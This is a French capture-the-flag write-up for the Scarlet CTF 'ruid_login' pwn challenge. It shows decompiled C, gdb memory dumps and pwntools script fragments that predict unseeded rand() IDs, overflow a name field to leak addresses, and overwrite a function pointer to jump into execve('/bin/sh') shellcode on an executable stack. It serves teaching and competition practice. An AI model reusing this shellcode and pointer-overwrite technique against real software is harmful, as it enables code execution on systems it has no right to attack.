+++
date = '2026-01-12T18:24:53+01:00'
draft = false
title = 'Ruid_login'
+++

<div class="attachments">
  <a href="/ctf/scarletctf_01_26/ruid_login/rand">rand</a>
  <a href="/ctf/scarletctf_01_26/ruid_login/rand.c">rand.c</a>
  <a href="/ctf/scarletctf_01_26/ruid_login/ruid_login">ruid_login</a>
  <a href="/ctf/scarletctf_01_26/ruid_login/solve.py">solve.py</a>
</div>

# Scarlet CTF

1er CTF de l'année un chall de pwn un peu cool

## ruid_login


```bash
└─$ checksec ./ruid_login
[*] '/home/sk4r/CTF/Scarlet/pwn_ruid_log/ruid_login'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

La stack est executable, il va surement falloir y placer un shellcode

```C
undefined8 main(void)

{
  char local_58 [72];
  
  setup_users();
  puts("Welcome to Rutgers University!");
  printf("Please enter your netID: ");
  ...
  // pas d'overflow possible
  read(0,local_58,0x40);
  ...
  printf("Accessing secure interface as netid \'%s\'\n",local_58);
  while( true ) {
    list_ruids();
    printf("Please enter your RUID: ");
    // pas de problèmes sur le scnaf non plus
    __isoc23_scanf("%lu%*c",&ruid);
    printf("Logging in as RUID %lu..\n",ruid);
    for (i = 0; i < 2; i = i + 1) {
      if (*(long *)(users + (long)i * 0x30 + 0x28) == ruid) {
        printf("Welcome, %s!\n",users + (long)i * 0x30);
        (**(code **)(users + (long)i * 0x30 + 0x20))();
      }
    }
```

Le programme commence par nous demander un netID qui à l'air de ne servir absolument à rien, nous allons mettre notre shellcode ici

```python
from pwn import *

io = process("./ruid_login")

shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"
io.sendlineafter(b"your netID", shellcode)
```

Suite à quoi on peut se 'connnecter' en tant qu'utilisateurs si on connait leur RUID, et le programme executera la fonction associée à cet utilisateur

Ces utilisateurs sont initialisés dans la fonction 'setup_users'

```C
void setup_users(void)

{
  char *local_38 [2];
  code *local_28 [3];

  local_38[0] = "Professor";
  local_38[1] = "Dean";
  local_28[0] = prof;
  local_28[1] = dean;
  for (i = 0; i < 2; i = i + 1) {
    strcpy(users + (long)i * 0x30,local_38[i]);
    ruid = rand();
    *(long *)(users + (long)i * 0x30 + 0x28) = (long)ruid;
    *(code **)(users + (long)i * 0x30 + 0x20) = local_28[i];
  }
  return;
}
```

On voit que leur ruid est généré avec rand() sans seed, ce seront donc toujours les mêmes, calculons les à l'avance

```C
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(){
    printf("%d\n", rand());
    printf("%d\n", rand());
}
```
```bash
└─$ ./rand      
1804289383
846930886
```

On peut maintenant se connecter en tant que 'Professor' ou 'Dean' et executer leurs fonctions

celle du prof n'est pas interessante en revanche celle de dean :
```C
void dean(void)

{
  int iVar1;
  uint local_14;

  puts("Change a staff member\'s name!");
  list_ruids();
  iVar1 = get_number(&local_14,2);
  if (iVar1 != 0) {
    printf("New name: ");
    read(0,users + (ulong)local_14 * 0x30,0x29);
  }
}
```

permet de modifier le nom du prof ou de dean avec un sacré overflow, 0x29 au lieu de 0x20, voici à quoi le prof et dean 'ressemblent' en mémoire :

```bash
(gdb) x/20gx &users
0x561c4c9dd0e0 <users   >:	0x6f737365666f7250	0x0000000000000072
0x561c4c9dd0f0 <users+16>:	0x0000000000000000	0x0000000000000000
0x561c4c9dd100 <users+32>:	0x0000561c4c9da2f3	0x000000006b8b4567
0x561c4c9dd110 <users+48>:	0x000000006e616544	0x0000000000000000
0x561c4c9dd120 <users+64>:	0x0000000000000000	0x0000000000000000
0x561c4c9dd130 <users+80>:	0x0000561c4c9da4d2	0x00000000327b23c6
```

Parfait, si on change le nom du professor pour remplir le buffer jusqu'a sa fonction on peut avoir un leak du code, car le nom de l'utilisateur est écrit après.

et les structures resemblent maintenant à:

```bash
(gdb) x/20gx &users
0x55f19a6db0e0 <users   >:	0x6161616161616161	0x6161616161616161
0x55f19a6db0f0 <users+16>:	0x6161616161616161	0x6161616161616161
0x55f19a6db100 <users+32>:	0x000055f19a6d820a	0x000000006b8b4567
0x55f19a6db110 <users+48>:	0x000000006e616544	0x0000000000000000
0x55f19a6db120 <users+64>:	0x0000000000000000	0x0000000000000000
0x55f19a6db130 <users+80>:	0x000055f19a6d84d2	0x00000000327b23c6
```

```python
# connect as dean
io.sendlineafter(b"your RUID", b"846930886")
#change prof name
io.sendlineafter(b"Num:", b"0")
io.sendlineafter(b"New name:", b"a"*0x20)
#receive the leak
io.recvuntil(b"a"*0x20)
leak = io.recv(6)
leak = u64(b"\xf3" + leak[1:] + b"\x00"*2)
```

Parfait on a donc un leak du code, mais nous c'est un leak de la stack qu'on veut car c'est la qu'est notre shellcode.

depuis le leak du code on peut calculer l'adresse de puts@plt et essayer de puts quelque chose au hasard en changeant la fonction du prof:

```python
# calcul de l'adresse de puts
puts_at_plt = leak - (0x55ac1c8742f3 - 0x55ac1c874050)
io.sendlineafter(b"your RUID", b"846930886")
io.sendlineafter(b"Num:", b"0")
io.sendlineafter(b"New name:", b"a"*0x20 + p64(puts_at_plt))
new_id = 0x000000006b8b450a
```
sans oublier de changer l'ID qu'on a réécrit avec notre string.
On appele donc la fonction du professor avec son nouvel ID
```python
io.sendlineafter(b"your RUID", str(new_id).encode())
io.recvuntil(b"a"*0x20)
io.recv(8)
leak_stack = u64(io.recv(6) + b"\x00"*2)
# -> leak_stack = 0x7ffed92d78e0
```
La chance, c'est une adresse de stack

on trouve notre shellcode qui est à l'addresse 0x7ffed92d7aa0

et on change l'adresse du professor par l'adresse de notre shellcode

```python
shell_at = leak_stack + (0x7ffed92d7aa0 - 0x7ffed92d78e0)
io.sendlineafter(b"your RUID", b"846930886")
io.sendlineafter(b"Num:", b"0")
io.sendlineafter(b"New name:", b"a"*0x20 + p64(shell_at))
```

On verifie quand même
```bash
(gdb) x/20gx &users
0x55f3c7d710e0 <users>:	0x6161616161616161	0x6161616161616161
0x55f3c7d710f0 <users+16>:	0x6161616161616161	0x6161616161616161
0x55f3c7d71100 <users+32>:	0x00007ffe0f8405a0	0x000000006b8b450a
0x55f3c7d71110 <users+48>:	0x000000006e616544	0x0000000000000000
0x55f3c7d71120 <users+64>:	0x0000000000000000	0x0000000000000000
0x55f3c7d71130 <users+80>:	0x000055f3c7d6e4d2	0x00000000327b23c6
0x55f3c7d71140:	0x0000000000000000	0x0000000000000000
0x55f3c7d71150:	0x0000000000000000	0x0000000000000000
0x55f3c7d71160:	0x0000000000000000	0x0000000000000000
0x55f3c7d71170:	0x0000000000000000	0x0000000000000000
(gdb) x/10gx 0x00007ffe0f8405a0
0x7ffe0f8405a0:	0x732f6e69622fb848	0x50c0315f54500068
0x7ffe0f8405b0:	0x050f5e545a543bb0	0x000000000000000a
0x7ffe0f8405c0:	0x0000000000000000	0x0000000000000000
0x7ffe0f8405d0:	0x0000000000000000	0x0000000000000000
0x7ffe0f8405e0:	0x0000000000000000	0xbc6180e2439a8900
```

Parfait, il n'y a plus qu'a appeler notre shellcode

```python
io.sendlineafter(b"your RUID", str(new_id).encode())
```

```bash
Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@+\x82(\xfd\x7f!
$ ls
core.100238  core.106070  core.106742  core.99580  rand.c      solve.py
core.100517  core.106553  core.30277   rand        ruid_login  wu.md
```

Thx.
Sk4r.